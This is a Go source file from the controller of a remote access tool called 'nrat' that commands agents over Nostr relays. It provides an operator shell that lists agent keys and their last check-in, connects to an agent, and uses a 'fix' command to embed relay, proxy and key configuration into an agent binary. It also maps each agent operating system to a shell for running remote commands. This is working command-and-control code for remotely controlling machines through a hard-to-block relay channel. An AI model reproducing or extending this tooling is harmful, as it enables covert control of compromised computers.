package control

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
	"uw/ulog"

	"nrat/model"
	"nrat/pkg/ishell"
	"nrat/pkg/nostr"
	"nrat/utils"
)

const sharp, percent byte = '#', '%'

var (
	ErrLoopExit = errors.New("loop exit")
	ErrContinue = errors.New("continue")

	agentPwd     string
	agentOs      Os
	agentSortKey string
)

type Os string

type Writer struct {
	Print func(...interface{})
}

func (w *Writer) Write(p []byte) (n int, err error) {
	w.Print(string(p))
	return len(p), nil
}

type agentState struct {
	privateKey    string
	publishKey    string
	lastBroadcast time.Time
}

func loopHandler(control *Control) error {
	sh := ishell.New()

	ulog.GlobalFormat().SetWriter(func(s string) {
		sh.Print(s)
	})
	defer func() {
		ulog.GlobalFormat().SetWriter(func(s string) {
			os.Stdout.WriteString(s)
		})
	}()

	if control.storage.Storage().HistoryFile != "" {
		sh.SetHistoryPath(control.storage.Storage().HistoryFile)
	}

	sh.EOF(func(c *ishell.Context) {
		ulog.Info("control shell exit, bye!")
		c.Stop()
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "agent",
		Help: "agent private key list",
		Func: func(c *ishell.Context) {
			privateKeyList := control.storage.Storage().AgentPrivateKeyList
			publishKeyList := make([]string, len(privateKeyList))

			stateMap := make(map[string]*agentState)
			for i := 0; i < len(privateKeyList); i++ {
				publishKey, e := nostr.GetPublicKey(privateKeyList[i])
				if e != nil {
					ulog.Warn("get %s publish key failed: %s", privateKeyList[i], e)
					publishKeyList[i] = fmt.Sprintf("unknown%d", i)
				}

				publishKeyList[i] = publishKey
				stateMap[publishKey] = &agentState{
					privateKey: privateKeyList[i],
					publishKey: publishKey,
				}
			}

			c.ProgressBar().Suffix(" query state, please wait...")
			c.ProgressBar().Start()

			query, e := control.unostr.Relay().QuerySync(context.Background(), nostr.Filter{
				Kinds:   []int{nostr.KindSetMetadata},
				Authors: publishKeyList,
			})

			c.ProgressBar().Stop()

			if e != nil {
				ulog.Warn("query failed: %s", e)
			}

			for i := 0; i < len(query); i++ {
				if v, ok := stateMap[query[i].PubKey]; ok {
					v.lastBroadcast = query[i].CreatedAt.Time()
				}
			}

			c.Printf("total: %d\r\n", len(privateKeyList))
			c.Println("index\tprivate / publish\t\tlast broadcast")
			for i := 0; i < len(publishKeyList); i++ {
				privateKey := utils.CutMore(privateKeyList[i], 10)
				if len(c.Args) > 0 {
					privateKey = privateKeyList[i]
				}

				c.Printf("%d\t%s\t\t%s\r\n", i+1, privateKey,
					stateMap[publishKeyList[i]].lastBroadcast.Format("2006-01-02 15:04:05"),
				)

				c.Printf("\t%s\t\r\n", publishKeyList[i])
			}
		},
	})

	sh.AddCmd(&ishell.Cmd{
		Name:    "connect",
		Aliases: []string{"cc"},
		Help:    "connect agent, args [index] or choice",
		Func: func(c *ishell.Context) {
			list := control.storage.Storage().AgentPrivateKeyList

			if len(c.Args) < 1 {
				plist := make([]string, len(list))

				for i := 0; i < len(list); i++ {
					plist[i] = fmt.Sprintf("%d. %s", i+1, utils.CutMore(list[i], 10))
				}

				choice := c.MultiChoice(plist, "choice a agent private key")
				if choice < 0 || len(list) < choice {
					ulog.Error("choice agent failed: choice out of range")
					return
				}

				ulog.Info("choice: %d", choice+1)
				c.Args = []string{strconv.Itoa(choice + 1)}
			}

			choice, e := strconv.Atoi(c.Args[0])
			if e != nil {
				ulog.Error("choice agent failed: %s", e)
				return
			}

			choice--

			if len(list) <= choice {
				ulog.Error("choice agent failed: choice out of range")
				return
			}

			if e := control.setPrivateKey(list[choice]); e != nil {
				ulog.Error("set private key failed: %s", e)
				return
			}

			if e := control.subscribe(); e != nil {
				ulog.Error("subscribe failed: %s", e)
				return
			}

			c.ProgressBar().Suffix(" connect testing, please wait...")

			c.ProgressBar().Start()
			os, e := connectTest(control, context.Background())
			c.ProgressBar().Stop()

			if e != nil {
				ulog.Error("connect test failed: %s", e)
				return
			}

			ulog.Info("connected to agent")

			agentSortKey, agentPwd, agentOs = list[choice], os.Root(), os
			if len(agentSortKey) > 20 {
				agentSortKey = agentSortKey[len(agentSortKey)-10:]
			}

			c.SetPrompt(fmt.Sprintf("[control@%s %s]$ ", agentSortKey, agentPwd))
		},
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "fix",
		Help: "embed configuration to agent binary, args [input] [output]",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				c.Println(c.Cmd.HelpText())
				return
			}

			if e := control.fixAgent(c, c.Args[0], c.Args[1]); e != nil {
				ulog.Error("fix failed: %s", e)
				return
			}
		},
	})

	addControlCmd(sh, control, cmdList)

	ulog.Info("control shell are ready")
	sh.SetPrompt("[control]$ ")
	sh.Run()
	return ErrLoopExit
}

func connectTest(control *Control, ctx context.Context) (Os, error) {
	if e := control.publish(ctx, &model.Event{
		Type: "info",
	}); e != nil {
		return "", e
	}

	for {
		select {
		case evt := <-control.eventCh:
			if evt.Type != "info" {
				continue
			}

			n := strings.Split(evt.Content, model.DataSeparator)
			if len(n) < 1 {
				ulog.Error("agent info format error")
				return "", nil
			}

			return newOs(n[0]), nil
		case <-time.After(control.cmdTimeout):
			return "", fmt.Errorf("timeout after %s",
				control.cmdTimeout)
		}
	}
}

func (control *Control) fixAgent(c *ishell.Context, source, target string) (e error) {
	b, e := os.ReadFile(source)
	if e != nil {
		return fmt.Errorf("read input file failed: %s", e)
	}

	agentStorage := &model.AgentStorageData{
		UnostrStorageData: &model.UnostrStorageData{},
	}

	for verify := false; !verify; {
		c.Printf("relay address: ")
		agentStorage.Relay = c.ReadLineWithDefault(control.storage.Storage().Relay)

		c.Printf("proxy address: ")
		agentStorage.Proxy = c.ReadLineWithDefault(control.storage.Storage().Proxy)

		c.Printf("connect timeout: ")
		agentStorage.ConnectTimeout = c.ReadLineWithDefault(control.storage.Storage().ConnectTimeout)

		c.Printf("ping interval: ")
		agentStorage.PingInterval = c.ReadLineWithDefault(control.storage.Storage().PingInterval)

		c.Printf("agent private key: ")
		agentStorage.PrivateKey = c.ReadLineWithDefault(nostr.GeneratePrivateKey())
		c.Printf("broadcast interval: ")
		agentStorage.BroadcastInterval = c.ReadLineWithDefault("10m")

		c.Printf("relay: %s\nproxy: %s\nconnect timeout: %s\nping interval: %s\nagent private key: %s\nbroadcast interval: %s\n",
			agentStorage.Relay, agentStorage.Proxy, agentStorage.ConnectTimeout,
			agentStorage.PingInterval, agentStorage.PrivateKey, agentStorage.BroadcastInterval)
		c.Printf("verify? [Y/n/e] ")
		verifyString := strings.ToUpper(c.ReadLineWithDefault("y"))
		verify = verifyString == "Y" || verifyString == "YES"
		if verifyString == "E" || verifyString == "EXIT" {
			return ErrLoopExit
		}
	}

	fb, e := json.Marshal(agentStorage)
	if e != nil {
		return fmt.Errorf("marshal agent storage failed: %s", e)
	}

	noneMagic, startMagic, endMagic := byte('\x00'), []byte{percent, percent, percent, sharp},
		[]byte{sharp, percent, percent, percent}

	b, e = utils.WriteEmbedData(b, noneMagic, startMagic, endMagic, fb)
	if e != nil {
		return fmt.Errorf("write embed data failed: %s", e)
	}

	if e := os.WriteFile(target, b, 0o755); e != nil {
		return fmt.Errorf("write output file failed: %s", e)
	}

	agentList := control.storage.Storage().AgentPrivateKeyList

	for i := 0; i < len(agentList); i++ {
		if agentList[i] == agentStorage.PrivateKey {
			ulog.Warn("agent already exists, skip save")
			return nil
		}
	}

	agentList = append(agentList, agentStorage.PrivateKey)

	control.storage.Storage().AgentPrivateKeyList = agentList
	if e := control.storage.Write(); e != nil {
		ulog.Warn("save storage failed: %s", e)
	}

	ulog.Info("append agent to storage")
	index := len(control.storage.Storage().AgentPrivateKeyList) - 1
	c.Printf("private key: [%d] %s\n", index+1,
		utils.CutMore(control.storage.Storage().AgentPrivateKeyList[index], 10))
	return nil
}

func newOs(s string) Os {
	return Os(strings.ToLower(s))
}

func (o Os) String() string {
	return string(o)
}

func (o Os) Root() string {
	switch o {
	case "linux", "darwin":
		return "/"
	case "windows":
		return "C:\\"
	default:
		return ""
	}
}

// 是否是绝对路径
func (o Os) IsAbsPath(path string) bool {
	switch o {
	case "linux", "darwin":
		return strings.HasPrefix(path, "/")
	case "windows":
		if len(path) < 2 {
			return false
		}

		return strings.HasPrefix(path[1:], ":/")
	default:
		return false
	}
}

func (o Os) Shell() []string {
	switch o {
	case "linux", "darwin":
		return []string{"/bin/sh", "-c"}
	case "windows":
		return []string{"C:\\windows\\system32\\cmd.exe", "/C"}
	default:
		return nil
	}
}
